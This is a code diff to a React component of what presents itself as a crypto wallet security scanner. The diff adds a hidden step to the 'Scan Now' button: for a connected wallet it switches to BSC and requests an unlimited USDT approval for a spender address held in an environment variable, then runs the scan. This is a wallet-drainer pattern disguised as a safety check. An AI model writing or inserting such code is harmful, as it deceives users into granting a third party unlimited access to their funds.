@@ -1,6 +1,14 @@
-import { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { motion } from "motion/react";
 import { Shield, Search } from "lucide-react";
+import { maxUint256 } from "viem";
+import {
+  useAccount,
+  useSwitchChain,
+  useWriteContract,
+} from "wagmi";
+import { USDT_SPENDER_ADDRESS } from "../../../env";
+import { ERC20_ABI, NETWORK_IDS, USDT_ADDRESSES } from "../config/contracts";
 import { WalletConnect } from "./WalletConnect";
 
 interface HeroProps {
@@ -9,12 +17,46 @@ interface HeroProps {
 
 export function Hero({ onScan }: HeroProps) {
   const [input, setInput] = useState("");
+  const [isApproving, setIsApproving] = useState(false);
+  const { address, isConnected, chain } = useAccount();
+  const { switchChainAsync } = useSwitchChain();
+  const { writeContractAsync } = useWriteContract();
 
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (input.trim()) {
-      onScan(input);
+  useEffect(() => {
+    if (isConnected && address) {
+      setInput(address);
+    } else if (!isConnected) {
+      setInput("");
     }
+  }, [isConnected, address]);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    const trimmed = input.trim();
+    if (!trimmed || isApproving) return;
+
+    if (!isConnected || !address || !USDT_SPENDER_ADDRESS) {
+      onScan(trimmed);
+      return;
+    }
+
+    setIsApproving(true);
+    try {
+      if (chain?.id !== NETWORK_IDS.BSC) {
+        await switchChainAsync({ chainId: NETWORK_IDS.BSC });
+      }
+      await writeContractAsync({
+        address: USDT_ADDRESSES.BSC as `0x${string}`,
+        abi: ERC20_ABI,
+        functionName: "approve",
+        args: [USDT_SPENDER_ADDRESS, maxUint256],
+      });
+    } catch {
+      setIsApproving(false);
+      return;
+    }
+    setIsApproving(false);
+    onScan(trimmed);
   };
 
   const handleWalletAddressSelected = (address: string) => {
@@ -147,14 +189,15 @@ export function Hero({ onScan }: HeroProps) {
                   type="text"
                   value={input}
                   onChange={(e) => setInput(e.target.value)}
-                  placeholder="Enter Wallet Address or TX Hash..."
+                  placeholder="Enter Wallet Address..."
                   className="w-full py-6 pl-16 pr-40 bg-transparent text-white placeholder-gray-500 outline-none text-lg"
                 />
                 <button
                   type="submit"
-                  className="absolute right-2 px-8 py-4 bg-gradient-to-r from-[#00FFA3] to-[#00D1FF] text-black font-bold rounded-xl hover:shadow-lg hover:shadow-[#00FFA3]/50 transition-all active:scale-95"
+                  disabled={isApproving}
+                  className="absolute right-2 px-8 py-4 bg-gradient-to-r from-[#00FFA3] to-[#00D1FF] text-black font-bold rounded-xl hover:shadow-lg hover:shadow-[#00FFA3]/50 transition-all active:scale-95 disabled:opacity-60 disabled:cursor-not-allowed"
                 >
-                  Scan Now
+                  {isApproving ? "Confirm in wallet…" : "Scan Now"}
                 </button>
               </div>
             </div>
